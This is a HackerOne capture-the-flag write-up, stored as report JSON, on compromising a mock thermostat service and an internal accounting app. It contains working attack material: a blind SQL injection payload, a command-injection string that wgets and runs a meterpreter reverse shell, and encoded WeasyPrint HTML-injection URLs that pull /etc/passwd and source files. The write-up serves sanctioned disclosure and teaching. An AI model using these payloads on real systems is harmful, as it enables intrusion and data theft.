{"id":504355,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDQzNTU=","url":"https://hackerone.com/reports/504355","title":"Various vulnerabilities ultimately lead to attacker control over FliteThermostat server and access to internal accounting application source code","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2019-03-03T01:28:08.810Z","submitted_at":"2019-03-03T01:28:08.810Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"collinmay","url":"/collinmay","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/358/631/64f8028474ea26506ce10aa7fb251f661de4e110_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":38489,"url":"https://hackerone.com/50m-ctf","handle":"50m-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"50m-ctf","twitter_handle":null,"website":"https://hackerone.com/","about":null}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-08T15:52:54.061Z","bug_reporter_agreed_on_going_public_at":"2019-04-05T21:50:16.056Z","team_member_agreed_on_going_public_at":"2019-04-08T15:52:53.954Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Step 1: The Entry Point\n(3:50 PM PST, Tuesday Afternoon)\n\n{F434398}\n\nThis image is the entrypoint for the 50m-ctf. It doesn't look like much at first, but one can clearly see that there's a lot of binary digits in the background. The immediate obstacle to trying to decode it is we don't know how many bits are cut off at the end of each line. Luckily, the bitstring seems to repeat itself every time there's an underscore (`_`), and this pattern is quickly confirmed using an image editor such as The GIMP.\n\n{F434413}\n\nNot only does this save on typing labor, but it allows us to determine the bits that were cut off by lining up multiple portions of the bitstring together.\n\n{F434412}\n\nI used the text tool in the GIMP to transcribe the bits and keep them lined up with those in the image so I'd be able to see if I missed one or counted one twice.\n\nAfter transcribing the entire bitstring, I brought it into IRB to decode:\n\n```\n$ irb # I'll be using irb throughout\n\u003e binary = \"011110100110110[...]101001\".scan(/.{8}/).map do |b| b.to_i(2) end.pack(\"C*\")\n # shortened for brevity\n =\u003e \"zlib+x\\x9CK\\xCA,\\xD1K\\xC9\\xD7[...]\"\n\u003e binary.unpack(\"H*\").first\n =\u003e \"7a6c69622b789c4bca2cd14bc9d7[...]\"\n```\n\nThe `zlib+` at the beginning suggested that the rest of the data is zlib compressed, and the following `789c` sequence [looks like a zlib header](https://stackoverflow.com/a/17176881/3029244).\n\n**Minor Pitfall:**\nThe first time I tried inflating the string, I got this error.\n```\n\u003e Zlib::inflate(binary[5, binary.length])\nZlib::DataError (invalid distance too far back)\n```\nThis suggsted that my transcription was mostly correct, but that I had likely flipped or misplaced a bit somewhere. I eventually determined that two spaces had made their way into the bitstring I transcribed, and broke the `.scan(/.{8})` trick I used for splitting the bitstring into bytes.\n\nThis was about when @spaceraccoon and I teamed up.\n\n**Successful Decoding:**\nAfter correcting the bitstring, it inflated to bit.do/h1therm.\n\n# Step 2: h1thermostat App\n(Hardcoded Keys: CWE-321)\n(7:30 PM PST, Tuesday Evening)\n\nThe bit.do link from the first step led to a download for a mysterious **h1thermostat.apk**. While I installed Android Studio and set up my Android emulator, I started to decompile the app.\n\n[dex2jar](https://github.com/pxb1988/dex2jar) made easy work of lifting the code from the apk to Java classfiles, and [jd-gui](http://jd.benow.ca/) did a *good enough(tm)* job of decompiling that all the way back to human-readable Java code. \n\n{F434411}\n\nThe first thing to notice is that this app is *tiny*, and that it seems to have some kind of login. At about that point, I got my Android emulator up and running.\n\n## Running the App\n\nThe first thing you see when you launch the app is a login screen, branded as **hackerone**, but with a warning to not use your hackerone credentials (likely to protect users in case someone compromises the backend, since this is a CTF after all). The app even includes code to warn users not to enter their hackerone credentials if they enter an email address.\n\nThe natural thing to do is to intercept its web requests and see how it talks to the backend. Luckily, the Android emulator makes hooking it up to a BURP proxy super easy.\n\n{F434410}\n{F434409}\n\nThe network request doesn't look decipherable at first glance, and the urlencoded base64 didn't decode to anything clear.\n\n```\n\u003e Base64.decode64(URI.decode(\"BivXQjx%2Bx1Vp0I5hlt[...]QKNMs%3D%0A\u0026h1`thh1ther\"))\n =\u003e \"\\x06+\\xD7B\u003c~\\xC7Ui\\xD0\\x8Ea\\x96\\xD3$B73v\\x85[...]\\xD1\\xD5nE\\xF2Xej\\x19T\\n4\\xCB\"\n```\n\nLooks like it's probably encrypted somehow. Time to turn back to the decompiled code...\n\n## Reading Decompiled Code\n\nSince we're concerned with the encryption of payloads in network requests, `PayloadRequest.class` seemed like a natural place to look, and indeed it paid off.\n\n{F434408}\n\nThe code converts the payload to a JSON string, then encrypts it using AES-128/CBC and a hardcoded secret key. It prepends the random initialization vector, then base64 encodes it to hand off to the HTTP library. Since AES is symmetric and we have the secret key from the code, we can **decrypt and encrypt network requests and responses**.\n\n```\n\u003e c = OpenSSL::Cipher::AES128.new(:cbc)\n\u003e c.decrypt\n\u003e c.key = [56, 79, 46, 106, 26, 5, -27, 34, 59, -128, -23, 96, -96, -90, 80, 116].pack(\"c*\")\n\u003e c.iv = rq[0, 16]\n\u003e c.update(rq[16, rq.length]) + c.final\n =\u003e \"{\\\"username\\\":\\\"abc\\\",\\\"password\\\":\\\"def\\\",\\\"cmd\\\":\\\"getTemp\\\"}\"\n```\n\nI wrote a quick web application F434415 using [Sinatra](http://sinatrarb.com/) that would take requests from the app, decrypt them, and log the decrypted requests. The responses from the backend (captured via BURP) were similarly encrypted and base64 encoded, but not url encoded. Since they used the same scheme, I could decrypt them too.\n\n```\n{\"success\": false, \"error\": \"Invalid username or password\"}\n```\n\nTo see what the rest of the app looked like, I made my sinatra application return encrypted responses with `\"success\": true`. BURP made it easy to redirect the app's network requests to my own mock backend.\n\n{F434407}\n{F434405}\n\nThe app itself doesn't actually do much (and looking at the code revealed no hidden functionality), so that meant the next step was to attack the backend.\n\n# Step 3: h1thermostat Backend\n(SQL Injection: CWE-89)\n(9:40 PM PST, Tuesday Night)\n\nSince I could talk to the backend, the first thing was to try breaking it with bad requests somehow.\n\n| Request | Response |\n| --- | --- |\n| `{\"username\": \"abc\", \"password\": \"def\", \"cmd\": \"getTemp\"}` | `{\"success\": false, \"error\": \"Invalid username or password\"}` |\n| `{\"username\": \"abc\", \"password\": \"def\", \"cmd\": \"setTemp\"}` | `{\"success\": false, \"error\": \"Invalid username or password\"}` |\n| `{\"username\": \"abc\", \"password\": \"def\"}` | `{\"success\": false, \"error\": \"Invalid username or password\"}` |\n| `{\"username\": \"abc\"}` | `{\"success\": false, \"error\": \"Invalid username or password\"}` |\n| `{}` | `{\"success\": false, \"error\": \"Unknown\"}` |\n| `{\"password\": \"def\"}` | `{\"success\": false, \"error\": \"Unknown\"}` |\n\nThe best error I was able to get was `Unknown`, which seemed to be the error for anything that prevented username lookup. The possibility for user lookup failure hinted me that there might be a SQL injection. Unfortunately, manual testing did not reveal any SQL injection in the username field.\n\n| Request | Response |\n| --- | --- |\n| `{\"username\": \"a'\"}` | `{\"success\": false, \"error\": \"Invalid username or password\"}` |\n\nI chalked this up to a lack of SQL injection technique on my part, so I used software that knows better than I do: [sqlmap](http://sqlmap.org/). I fitted some more functionality onto my mock backend F434415 from the previous step to add an endpoint that converted GET parameters to a JSON request, encrypted it, sent it to the backend, decrypted, and returned the response. It acted as a proxy so that I could hit the site with sqlmap.\n\n{F434406}\n\nsqlmap didn't seem to find anything the first time around, but it helpfully suggested using `--level` and `--risk`, so I tried `--level 5`.\n\n{F434404}\n\nThis yielded exploitable SQL injections, albeit slow and blind ones. **These can be reproduced** by sending the following request to the backend: `{\"username\": \"a' AND (SELECT * FROM (SELECT(SLEEP(5)))gfMZ)-- MdWK\", \"password\": \"b\", \"cmd\": \"getTemp\"}`.\n\nI listed the names of the databases, and the one of interest seemed to be `flitebackend`, containing two tables: `users` and `devices`. I was interested in `users` first, so I set sqlmap to dump it and it came back with one row.\n\n```\nid,username,password\n1,admin,5f4dcc3b5aa765d61d8327deb882cf99\n```\n\nOnline hash lookup tools quickly revealed the password hash to be `md5(password)`, meaning that `admin:password` was the login, which I feel like I should've guessed way earlier. Dumping part of the devices table revealed it to be a list of either local network IPs, or IPs that didn't respond to anything.\n\n```\nid,ip\n1,192.88.99.253\n2,192.88.99.252\n3,10.90.120.23\n4,244.188.235.4\n...\n91,10.186.74.138\n92,192.88.99.164\n93,192.88.99.69\n94,192.88.99.239\n```\n\nBy some stroke of insight though, only after trying sqlmap's file I/O functionality, I decided to dump the rest of the table and feed it to nmap.\n```\nNmap scan report for 98.12.196.104.bc.googleusercontent.com (104.196.12.98)\nHost is up (0.073s latency).\nNot shown: 997 filtered ports\nPORT     STATE  SERVICE\n22/tcp   open   ssh\n80/tcp   open   http\n3389/tcp closed ms-wbt-server\n\nNmap done: 151 IP addresses (1 host up) scanned in 14.73 seconds\n```\n\nThis discovered the next step: FliteThermostat.\n\n# Step 4: FliteThermostat Login\n(Timing Attack: CWE-208)\n(12:40 AM, Wednesday Morning)\n\nVisiting the IP from the previous step in a web browser presented a login screen for a *FliteThermostat*. \n{F434403}\n\nThis login form uses some JavaScript to run a (custom?) unidentified hash function on the username and password, sending only the hash to the server. Guessing names revealed a `/setTemp` endpoint, but it didn't seem to do anything without authentication.\n\nWe initially thought that perhaps some property of the hash function gave it a very small range that would be practical to brute-force, but we couldn't determine this. After twelve hours, @spaceraccoon had the insight that it might be a timing attack. Anticipating a low signal-to-noise ratio when it came to timings, I determined that the server was hosted on Google Compute Cloud in the us-east4 (North Virginia) region and spun up a VPS in the same region in order to cut down on variablity in round-trip time. After setting up a script to brute-force every value for the first byte of the hash (setting the rest of the hash to all zeroes), running a few trials, and keeping track of the average time for each value, I made a graph.\n\n{F434402}\n\nOne look at the graph makes it extremely obvious which byte the correct hash starts with. Spaceraccoon wrote a script F434416 to determine for each byte of the hash which value had the longest response time, but for each byte we got correct, it took half a second longer to verify or reject.\n\n| Number of Bytes Correct | Approximate Time to Verify |\n| --- | --- |\n| 1 | 1.08 |\n| 2 | 1.58 |\n| 3 | 2.08 |\n| ... | ... |\n| 32 | 16.5 |\n\nWith 32 bytes, by the end, it took ~16.5 seconds to check a single value. With an average of 128 attempts per byte for 32 bytes, this would've taken 9 hours, so spaceraccoon decided to try a multithreaded approach.\n\nHowever, this led to some consistency issues as well. Request times sometimes fluctuated greatly, up to 20 seconds or more. This led to the wrong value being selected. As such, he added error-checking to the script, restarting the tests for a byte if the best candidate had an increase of != 0.5 seconds in response time. This worked well, but for the last few bytes, timings became inconsistent again, and he had to manually test the top few candidates. 7 hours after confirming the existence of a timing attack, we found the hash.\n\n```\nf9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8\n```\n\n# Step 5: FliteThermostat\n(Shell Expansion: CWE-94)\n(10:20 PM PST, Wednesday Night)\n\n**Reconnaissance:**\n\nAfter logging in with the hash recovered via timing attack, we were able to access several new interfaces. The *FliteThermostat Admin* page had links to two other pages, and a third for \"Diagnostics\" that was commented out. I wrote some Ruby bindings to make logging in and hitting the various endpoints from an interactive console easier (this is a bit of a pattern).\n\n{F434401}\n\nThe update check seemed the most interesting, but we had no way to access any `update.flitethermostat` server to retrieve any update manifest, so I turned to checking sanitization on the temperature control. While it only accepted integer inputs, it accepted numbers far outside normal temperature ranges (-100000000, 9999999, etc.). Nothing interesting there, though.\n\nThe diagnostics page seemed promising, but was `Forbidden`. We thought that perhaps there was another hash we had missed that would grant access, but couldn't find any such hash.\n\n**A Dead End:**\n\nNext, we looked at the session cookies.\n```\neyJsb2dnZWRJbiI6dHJ1ZX0.XHeQUg.LzIfeLwN9twAqHd3zAK7VJoKDZc\n```\n\nAt first glance, this looks like a JSON Web Token, but decoding it revealed that this was not the case.\n```\n\u003e token.split(\".\").map do |part| Base64.urlsafe_decode64(part) end\n =\u003e [\"{\\\"loggedIn\\\":true}\", \"\\\\w\\x90R\", \"/2\\x1Fx\\xBC\\r\\xF6\\xDC\\x00\\xA8ww\\xCC\\x02\\xBBT\\x9A\\n\\r\\x97\"]\n ```\n The purpose of the first field was farily obvious. After dumping several tokens, I noticed that the middle field incrememted by about 16 each time, which tipped me off that it was a UNIX timestamp. The third field, being 20 bytes, was likely a SHA-1 hash. It seemed to validate both the JSON and the timestamp. We tried a length extension attack on the hash, but couldn't get it to work (the server uses the Flask framework, which [uses HMAC](https://pythonhosted.org/itsdangerous/) to protect session cookies). Even if we had gotten it to work, we wouldn't have been able to affect the JSON values or know what we needed to change.\n \n **A Hint:**\n \n Finally, spaceraccoon was tipped off that the `/update` endpoint has a `port` parameter that could be used to change the port it tried to use to connect to the update server. It seemed to have the same integer sanitization as the temperature control, which meant there wasn't a whole lot we could do with it. Eventually, we were tipped off that there is a second parameter consisiting of two words separated by an underscore. I put together a basic wordlist including every relevant word I could think of (`update`, `server`, `download`, `manifest`, `path`, etc.) and used [wfuzz](https://wfuzz.readthedocs.io/en/latest/) to try to determine what it was. While I was fuzzing, spaceraccoon happened to guess that it was `update_host`, which included a word (`host`) that I had somehow missed in my wordlist.\n \n This new parameter had significantly less sanitization than `port`, which let us construct URLs like this (`update_host: foo.myhost.com/mypath?`, `port: 1`):\n ```\n http://foo.myhost.com/mypath?:1/\n ```\n \n Unfortunately, nothing that we tried (hostname, ip address, ipv4 address, ipv6 address, listening for traffic on custom dns nameserver, fuzzing ports, other IPs from h1thermostat backend's device table, etc.) caused any identifiable network traffic to any machine we controlled (listening via tshark). We were particularly interested in trying to get it to communicate over ipv6, so that we could listen for packets over the significantly quieter ipv6 address space.\n \n **The Winning Move:**\n (6:45 AM PST, Thursday Morning)\n \nI woke up Thursday morning to find that Spaceraccoon had discovered how to get something interesting out of `/update`.\n \n ```\n GET http://104.196.12.98/update?update_host=$PWD\n \n Connecting to http:///app:5000/ and downloading update manifest\n...\n...\n...\nCould not connect\n ```\n \nThe endpoint performed shell expansions, which he quickly realized also included `$(echo hello world)`-style expansions. Using that to dump the application code revealed that the `/update` endpoint made no attempts to connect to any network, and that the `/diagnostics` endpoint always returned `Forbiddden`.\n \n# Step 6: Network Probing\n(9:00 AM PST, Thursday Morning)\n \nWhen I woke up, I worked on running [Meterpreter](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/) on the FliteThermostat server. I used `msfvenom` to generate an executable that would connect back to my server, giving me an interactive prompt.\n \n ```\n $ msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o /webroot/.meterpreter LHOST=\u003cmy-server-ip\u003e LPORT=4444\n $ msfconsole\n ...\nmsf5 \u003e use exploit/multi/handler\nmsf5 exploit(multi/handler) \u003e set payload linux/x64/meterpreter/reverse_tcp\npayload =\u003e linux/x64/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) \u003e set LHOST \u003cmy-server-ip\u003e\nLHOST =\u003e \u003cmy-server-ip\u003e\nmsf5 exploit(multi/handler) \u003e run\n[*] Started reverse TCP handler on \u003cmy-server-ip\u003e7:4444 \n\n// In an irb session...\nirb \u003e require_relative \"flite.rb\"\nirb \u003e ft = FliteThermostat.new\nirb \u003e ft.login\nirb \u003e ft.update(:update_host =\u003e \"$(wget \u003cmy-server\u003e/.meterpreter -O /tmp/xtm; chmod +x /tmp/xtm; /tmp/xtm\")\n\n// In msfconsole...\n[*] Sending stage (861348 bytes) to 104.196.12.98\n[*] Meterpreter session 1 opened (\u003cmy-server-ip\u003e:4444 -\u003e 104.196.12.98:44436) at 2019-03-02 02:37:33 -0800\n```\n\n{F434400}\n\nWhile I worked on getting meterpreter running, spaceraccoon used the raw shell expansion to determine the machine's local ip address. He did this by running `cat /etc/hosts`, discovering the entry `172.19.0.2 4d131d414079`. A quick check for `$HOSTNAME` confirmed that this was the server's IP address on the private network. He started probing the network and quickly found a host at `172.19.0.3`, and used curl to retrieve it's main page, which revealed itself to be an accounting application. I used meterpreter's `portfwd` function to forward a port from my server to the other host's (`172.19.0.3`) port 80, which made it much easier for us to see the application.\n\nUnfortunately, every once in a while, something would kill my meterpreter sessions. I think it was something killing the unresponsive application process worker that was parenting my meterpreter process, but I never checked and instead just relaunched it every time it died. At some point I tried moving it to an nginx process, but a bug in meterpreter kept this from working.\n\n# Step 7: Accounting Part 1\n(9:30 AM PST, Thursday Morning)\n(Code Injection CWE-94)\n\n{F434399}\n\nMost of the pages on this application just presented us with a login screen. However, hidden in the HTML for the navigation bar was a link to hidden endpoint: `/invoices/new`.\n\n{F434397}\n\nThis page contains a form that can be used to create invoices, and some JavaScript code to generate the requests for HTML preview and PDF rendering. PDF rendering immediately set off alarm bells in my head, so I looked up what PDF-generation libraries were available and compared their output to what I was getting from the application. I found that [WeasyPrint](https://weasyprint.org/)'s samples matched the application's output the best, since they both claimed to be using [cairo](https://www.cairographics.org/) and WeasyPrint [generates PDFs using](https://github.com/Kozea/WeasyPrint/blob/bdd45475b6e3363e8062fe700dea3d574563721f/weasyprint/document.py#L16) cairo.\n\nFinally, looking at the network requests revealed that while the JavaScript code serializes the invoice, it also has some control over the CSS styling over the resulting document.\n\n```\n{\n  \"companyName\": \"Acme Tools\",\n  \"email\": \"accounting@acme.com\",\n  \"invoiceNumber\": \"0001\",\n  \"date\": \"2019-04-01\",\n  \"items\": [\n    [\"1\", \"\", \"\", \"10\"]\n  ],\n  \"styles\": {\n    \"body\": {\n      \"background-color\": \"white\"\n    }\n  }\n}\n```\nThere was an attack published against [tcpdf](https://tcpdf.org/) several years ago wherein the authors used its special `\u003ctcpdf\u003e` tag to embed fake fonts into the PDF that were actually remote files. Although no such magic tags seem to exist in WeasyPrint, I wondered what possibilities for Server-Side Request Forgery and Remote File Inclusion existed. The invoice fields proved to be sufficiently sanitized so as to prevent injecting arbitrary HTML tags.\n\n**Dead End 1:**\n All the codepaths dealing with fonts that I found in WeasyPrint seemed to pass the font files off to Pango, which would surely throw an error on anything that didn't look like a font (and not to mention that I couldn't inject anything that would load a font anyway), so I figured the best route of attack would be to use the CSS `background-image` property to load an image I controlled. Setting `background-image: url(\u003curl-to-image\u003e.png)` successfully loaded my custom background image in the preview and embedded it in the PDF, so I thought to try an SVG.\n \n I wrote an SVG file including several `\u003cuse\u003e` tags pointing to [`http://webhook.site/`](http://webhook.site/) URLs, which got hit and the `\u003ctext\u003e` tags I had them return wound up in the rendered PDF.\n \n{F434396}\n \n Unfortunately, the text fetched from the URLs had to be valid XML and valid SVG, so that wasn't going to get us anywhere.\n \n **Dead End 2:**\n Hidden in the JavaScript for `/invoice/new` were two comments:\n ```\n// kTHJ9QYJY5597pY7uLEQCv9xEbpk41BDeRy82yzx24VggvcViiCuXqXvF11TPusmb5TucH\n//  5MmCWZhKJD29KVGZLrB6hBbLkRPn8o6H5bF73SgHyR3BdmoVJ9hWvtHfD3NNz6rBsLqV9\n ```\n Although they appear at first to be base64, they don't decode to anything meaningful that way. I made a sorted list of each unique character that appeared in these strings.\n ```\n \u003e mystery.chars.group_by do |c| c end.keys.sort.join\n =\u003e \"123456789BCDEFGHJKLMNPQRSTVWXYZbcdefghikmnopqrstuvxyz\"\n ```\n This revealed there to be 53 unique characters, and notably missing were `0`, `O`, `I`, and `l`. This suggested base58, and decoding using the bitcoin alphabet produced a hex string:\n ```\n 9d9a8bdf86908adf8b97908a98978bdf8b97968cdf88908a939bdf9d9adf8c90929a8b97969198df96918b9a8d9a8c8b969198\n ```\n Unfortunately, we couldn't find any meaning to this. It later turned out to be a red herring.\n \n **Dead End 3:**\nAlthough normally an invalid login gives an `Invalid username or password` message, putting a `'` in the password field caused an internal server error. This hinted at a SQL injection, so I pointed sqlmap toward the login form, but the first scan failed to find any injections. I tried again with deeper scan settings, and scans that were repeated from the first time found injections this time. Sqlmap kept guessing that the DBMS was something obscure (I was fairly sure the application was using MySQL/MariaDB), and I couldn't get consistent readings out of it. This turned out to be yet another red herring.\n\n**The Winning Move:**\nI decided to revisit the input sanitization, this time putting stray `\u003c`s and `\u003e` in every field I could, using the preview functionality to view the HTML that was presumably being passed to WeasyPrint. Eventually, I found that the keys for CSS property names could contain those characters without them getting converted to `\u0026lt;` and `\u0026gt;`. \n\n{F434395}\n\nUnfortunately, while `\u003ctest\u003e` did not get stripped out, `\u003c/test\u003e` did. Recalling a [tip I read](https://support.portswigger.net/customer/portal/articles/2590821-xss-beating-html-sanitizing-filters) on beating input sanitization, I tried `\u003c/te\u003c/test\u003est\u003e`, hoping that only the inner `\u003c/test\u003e` would get removed, and my hopes were confirmed. Closing the `\u003cstyle\u003e` tag, I could finally add my own elements.\n\n{F434394}\n\n# Step 8: Accounting Part 2\n(7:52 PM, Thursday Evening)\n(Remote File Inclusion CWE-98)\n\nNow that I could inject arbitrary HTML tags, I needed a way to dump the application code. Spaceraccoon recalled reading an [article](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html) describing a PDF generation attack that used JavaScript to include remote files, but WeasyPrint's source code made it evident that it didn't run JavaScript. We also determined that WeasyPrint was not vulnerable to XML External Entity attacks. Reading [document.py](https://github.com/Kozea/WeasyPrint/blob/bdd45475b6e3363e8062fe700dea3d574563721f/weasyprint/document.py#L325) suggested that I could include arbitrary files along the PDF by using `\u003clink rel=\"attachment\"\u003e` tags, and I found that `\u003ca rel=\"attachment\"\u003e` tags worked as well. I tested against a local copy of WeasyPrint.\n\n```\n$ cat tst/test.html\n\u003chtml\u003e\n\t\u003cbody\u003e\n\t\t\u003ch1\u003eHello, World!\u003c/h1\u003e\n\t\t\u003ca rel=\"attachment\" href=\"http://\u003cmy-server\u003e\"\u003elink\u003c/a\u003e\n\t\u003c/body\u003e\n\u003c/html\u003e\n$ weasyprint tst/test.{html,pdf}\n$ qpdf --qdf --object-streams=disable tst/test{,_uncomp}.pdf\n```\nI opened `tst/test_uncomp.pdf` in a text editor, and sure enough, it contained a complete copy of the raw HTML of my server's index. Injecting a similar `\u003ca\u003e` tag into the CSS on the Accounting application, this time targeting `/etc/passwd` (the FliteThermostat application had access to this, so I figured the Accounting application would, too), indeed yielded a copy of the container's `/etc/passwd` file.\n\n```\n$ wget -O test.pdf 'http://\u003caccounting-server\u003e/invoices/pdfize?d={%22companyName%22:%22c%22,%22email%22:%22e%22,%22invoiceNumber%22:%22n%22,%22date%22:%22d%22,%22items%22:[[%221%22,%22n%22,%22d%22,%2210%22]],%22styles%22:{%22body%22:{%22%3C/sty%3C/test%3Ele%3E%3Ca%20rel=\\%22attachment\\%22%20href=\\%22file:///etc/passwd\\%22%3Etest%3C/%3C/test%3Ea%3E%22:%22%22}}}''\n$ qpdf --qdf --object-streams=disable test{,_uncomp}.pdf\n$ cat test_uncomp.pdf\n...\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false\nnginx:x:101:102:nginx user,,,:/nonexistent:/bin/false\nmessagebus:x:102:103::/var/run/dbus:/bin/false\n...\n```\n\nThe only thing left to do was to guess where the application code was. Since it was at `/app/main.py` on FliteThermostat, that was the first thing I tried.\n\n```\n$ wget -O app.pdf 'http://\u003caccounting-server\u003e/invoices/pdfize?d={%22companyName%22:%22c%22,%22email%22:%22e%22,%22invoiceNumber%22:%22n%22,%22date%22:%22d%22,%22items%22:[[%221%22,%22n%22,%22d%22,%2210%22]],%22styles%22:{%22body%22:{%22%3C/sty%3C/test%3Ele%3E%3Ca%20rel=\\%22attachment\\%22%20href=\\%22file:///app/main.py\\%22%3Etest%3C/%3C/test%3Ea%3E%22:%22%22}}}''\n$ qpdf --qdf --object-streams=disable app{,_uncomp}.pdf\n$ cat app_uncomp.pdf\n...\n\"\"\"\nCONGRATULATIONS!\n\nIf you're reading this, you've made it to the end of the road for this CTF.\n\nGo to https://hackerone.com/50m-ctf and submit your write up, including as much detail as you can.\nMake sure to include 'c8889970d9fb722066f31e804e351993' in the report, so we know for sure you made it through!\n\nCongratulations again, and I'm sorry for the red herrings. :)\n\"\"\"\n...\n```\n\nVictory! Now that I finally had the application code, I could also see what had been causing sqlmap so much confusion:\n\n```\nif error is False or (\"'\" in password and 'sqlmap' in request.headers.get('User-Agent') and random.randrange(3) != 0):\n\traise Exception('SQL Error')\n```\n\nThat is *capital 'E'* Evil!\n\n# Thanks\n\nThere are two people who I feel this report would be incomplete if I didn't give thanks to:\n- @spaceraccoon, whose brilliant insight, friendly attitude, and incredible dedication made all the difference in the world when it came to finishing this CTF. I don't know if either of us could've done it alone.\n- @daeken, whose influence was not only limited to getting me involved in hacking in the first place, nor was it limited to putting this entire CTF together, but who helped me grow as a hacker during our time attacking the Nintendo Switch. He helped me bring binary exploitation from the realm of gods to something I not only could do, but enjoyed, and, most importantly, constantly curbed my impostor syndrome by subtly pushing me to keep going.\n\n## Impact\n\n# Step 1: Entrypoint\nAccess to hidden files (h1thermostat.apk).\n\n# Step 2: h1thermostat App\nSince the encryption keys are hardcoded in the app, attackers can easily retrieve them and use them to encrypt/decrypt transactions with the backend. Asymmetric cryptography could be used to ensure that attackers cannot decrypt captured requests or backend responses.\n\n# Step 3: h1thermostat Backend\nThe SQL injection in the `username` field allows attackers to trivially dump the entire `flitebackend` database, as well as lots of other database metadata. The `users` table of this database contains weak and unsalted MD5 hashes that can easily be looked up via rainbow table. We found `admin:password` to be a valid login, which should definitely be changed. The `devices` table of this database contains IP addresses for FliteThermostat devices, which are presumably sensitive customer information.\n\n# Step 4: FliteThermostat Login\nThe FliteThermostat server leaks information on how many bytes of the submitted hash are correct via a timing attack, making it practical to recover a valid hash over the course of a few hours and completely bypass authentication. Additionally, the hashing algorithm seems to be custom-made. If so, it has likely not been subject to thorough crypt-analytic review and may have theoretical attacks. We did not check.\n\n# Step 5: FliteThermostat Admin\nThe `/setTemp` endpoint has insufficient input sanitization, allowing attackers to set very high or very low temperatures, potentially costing customers not only extreme discomfort, but also the cost that it takes to keep their cooling systems running if an attacker sets a very low temperature while the customer is away from home and unable to notice.\n\nThe `/update` endpoint contains a shell expansion, which critically **gives an attacker control over the application server**. We used it to pivot through the network, but a malicious attacker could replace application code (!). This includes modifying the login form to submit raw usernames and passwords, and recovering them server-side.\n\n# Step 6: Network Pivot\nWe found that the FliteThermostat server had access to an accounting server (`172.19.0.3`) containing sensitive company information. Using the shell expansion attack from step 5, we were able to access this application. We suggest that internet-facing services be placed on a separate network from internal company services.\n\n# Step 7: Accounting\nAlthough most endpoints on this application were properly authenticated, we found in an HTML comment an endpoint at `/invoices/new` that was not authenticated. On its own, this has little security impact aside from a potential DoS by causing WeasyPrint to take a very long time to render PDFs by injecting CSS that causes WeasyPrint to retrieve images that will never be fully retrieved (think /dev/zero). Several such attacks are described in the [Security](https://weasyprint.readthedocs.io/en/latest/tutorial.html#security) section of the WeasyPrint documentation.\n\nThe input sanitization for invoice rendering is generally sufficient, except for on CSS properties where we were able to use the `\u003c` and `\u003e` characters. Although `\u003c/tag\u003e` strings were filtered out, we were able to circumvent this by writing `\u003c/t\u003c/tag\u003eag\u003e` since only the inner one got filtered. This allows an attacker to inject arbitrary HTML into invoices rendered by WeasyPrint. We suggest using the same input sanitization on CSS properties as what is used for the invoice fields. This would have similar impact as the CSS image inclusion I described above, except...\n\n# Step 8: WeasyPrint\nWeasyPrint includes functionality for attaching local files to PDFs via `\u003ca rel=\"attachment\" href=\"file:///path/to/file\"\u003e` tags. The resource at the given URL is fetched and embedded directly into the PDF, which can then be retrieved by an attacker. This includes resources such as `/etc/passwd` and `/app/main.py`, allowing attackers to retrieve the application's source code for further reverse engineering. Had the application used a database, attackers would be able to retrieve these database credentials and access the database from the compromised FliteThermostat instance on the same network, stealing valuable and confidential company information. We suggest modifying WeasyPrint to remove file attachment functionality.","weakness":{"id":70,"name":"Code 